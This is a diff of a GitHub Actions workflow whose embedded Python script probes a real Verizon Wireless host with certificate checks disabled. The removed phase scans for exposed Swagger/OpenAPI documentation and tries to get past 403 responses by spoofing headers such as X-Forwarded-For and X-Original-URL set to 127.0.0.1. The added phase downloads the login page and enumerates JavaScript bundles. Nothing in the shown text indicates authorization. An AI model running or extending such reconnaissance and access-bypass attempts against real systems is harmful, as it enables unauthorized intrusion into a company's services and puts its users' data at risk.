@@ -1,88 +1,62 @@
-name: EMAG Phase 5
+name: EMAG Phase 6
 on:
   workflow_dispatch:
   push:
     branches: [main]
 
 jobs:
-  phase5:
+  phase6:
     runs-on: ubuntu-latest
     timeout-minutes: 10
     steps:
-      - name: EMAG Phase 5
+      - name: EMAG Phase 6
         run: |
           python3 - << 'PYEOF'
           import urllib.request, urllib.error, json, ssl, time
           ctx = ssl.create_default_context()
           ctx.check_hostname = False
           ctx.verify_mode = ssl.CERT_NONE
-          
           BASE = "https://ess.emag.verizonwireless.com"
-          AM = "https://mblogin.verizonwireless.com"
           
-          def req(method, url, data=None, headers=None):
-              h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
+          def get(url, headers=None, maxbytes=16384):
+              h = {"User-Agent": "Mozilla/5.0"}
               if headers: h.update(headers)
-              if isinstance(data, dict): body = json.dumps(data).encode()
-              elif isinstance(data, str): body = data.encode()
-              else: body = data
-              rq = urllib.request.Request(url, data=body, headers=h, method=method)
+              rq = urllib.request.Request(url, headers=h)
               try:
                   op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
-                  with op.open(rq, timeout=12) as r:
+                  with op.open(rq, timeout=15) as r:
                       ct = r.headers.get("Content-Type","")
-                      rb = r.read(8192).decode("utf-8", errors="replace")
-                      return r.status, ct, rb, dict(r.headers)
+                      rb = r.read(maxbytes).decode("utf-8", errors="replace")
+                      return r.status, ct, rb
               except urllib.error.HTTPError as e:
-                  ct = e.headers.get("Content-Type","")
-                  return e.code, ct, e.read(2048).decode("utf-8", errors="replace"), dict(e.headers)
+                  return e.code, "", e.read(512).decode("utf-8", errors="replace")
               except Exception as e:
-                  return 0, "", str(e), {}
+                  return 0, "", str(e)
           
-          print("=== EMAG Swagger/OpenAPI ===")
-          for path in [
-              "/emag/swagger-ui.html", "/emag/swagger-ui/",
-              "/emag/swagger-ui/index.html", "/emag/swagger",
-              "/emag/api-docs", "/emag/v2/api-docs", "/emag/v3/api-docs",
-              "/emag/openapi", "/emag/openapi.json", "/emag/openapi.yaml",
-              "/emag/swagger.json", "/emag/swagger.yaml",
-              "/emag/webjars/swagger-ui/",
-          ]:
-              s, ct, b, h = req("GET", BASE + path)
-              is_html = "<html" in b[:50].lower()
-              if "json" in ct or "yaml" in ct or "swagger" in b[:100].lower() or not is_html:
-                  print(f"[{s}] {path} ({ct[:25]}): {b[:150]}")
-          
-          print()
-          print("=== 403 Headers Analysis ===")
-          s, ct, b, h = req("GET", BASE + "/emag/api/messages")
-          print(f"[{s}] Headers: {dict(list(h.items())[:10])}")
-          print(f"Body: {repr(b[:100])}")
-          
-          print()
-          print("=== 403 Bypass Attempts ===")
-          for hdrs_extra in [
-              {"X-Forwarded-For": "127.0.0.1"},
-              {"X-Real-IP": "127.0.0.1"},
-              {"X-Forwarded-Host": "localhost"},
-              {"X-Original-URL": "/"},
-              {"X-Custom-IP-Authorization": "127.0.0.1"},
-              {"X-Forwarded-For": "10.0.0.1"},
-              {"Accept": "*/*"},
-              {"Accept": "text/html,application/xhtml+xml"},
-          ]:
-              s, ct, b, h = req("GET", BASE + "/emag/api/messages", None, hdrs_extra)
-              is_html = "<html" in b[:50].lower()
-              if s != 403 or not is_html:
-                  print(f"[{s}] {hdrs_extra}: {b[:100]}")
-              else:
-                  print(f"[{s}] {list(hdrs_extra.keys())[0]}: same 403")
-          
-          print()
-          print("=== EMAG Full HTML source ===")
-          s, ct, b, h = req("GET", BASE + "/emag/")
-          print(f"[{s}] Full HTML ({len(b)} chars):")
+          print("=== Full login HTML (32KB) ===")
+          s, ct, b = get(BASE + "/emag/", maxbytes=32768)
+          print(f"[{s}] {len(b)} chars")
           print(b)
+          
+          print()
+          print("=== EMAG JavaScript files ===")
+          js_paths = [
+              "/emag/assets/js/backbone-concat.js",
+              "/emag/assets/js/app.js",
+              "/emag/assets/js/main.js",
+              "/emag/assets/js/emag.js",
+              "/emag/assets/js/emag-app.js",
+              "/emag/assets/js/bundle.js",
+              "/emag/assets/js/vendor.js",
+              "/emag/assets/js/router.js",
+              "/emag/assets/js/routes.js",
+          ]
+          for path in js_paths:
+              s, ct, b = get(BASE + path, maxbytes=2048)
+              if s == 200:
+                  print(f"[{s}] FOUND {path} ({len(b)} chars): {b[:500]}")
+              else:
+                  print(f"[{s}] {path}")
           
           print("DONE")
           PYEOF
